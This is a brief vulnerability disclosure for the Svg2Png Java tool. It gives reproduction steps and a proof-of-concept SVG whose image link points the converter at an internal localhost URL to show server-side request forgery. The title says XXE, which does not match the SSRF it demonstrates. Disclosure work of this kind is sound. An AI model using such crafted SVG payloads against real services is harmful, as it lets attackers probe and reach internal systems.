# :book: Description

 `Svg2Png` Manage your Icons in SVG and generate the needed PNG into your projects as needed. No "Web Service" needed, just an executable JAR file. this package is vulnerable to `(XXE)`.

https://github.com/sterlp/svg2png

# :recycle:  Steps To Reproduce-:  
  0) download and run latest release from https://github.com/sterlp/svg2png/releases
  1) You have to have Java 8 installed on your PC
  1) creat a payload svg or use : (this is a example of SSRF )https://drive.google.com/file/d/1jGhUXepvOV9bs_aaCThSmqloY_C1Nsj4/view?usp=sharing

rc3.svg
```
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;" width="300" height="200">
<image x="10" y="10" width="276" height="110" xlink:href="http://localhost:8080/svg" stroke-width="1" id="image3204" />
<rect x="0" y="150" height="10" width="300" style="fill: black"/>
</svg>
```

# POC
  [gdrive](https://drive.google.com/file/d/1JNgemPOp2rqEdwjucBzM9eCfy7Wu_Z2k/view?usp=sharing)
## 💥 Impact
SSRF 
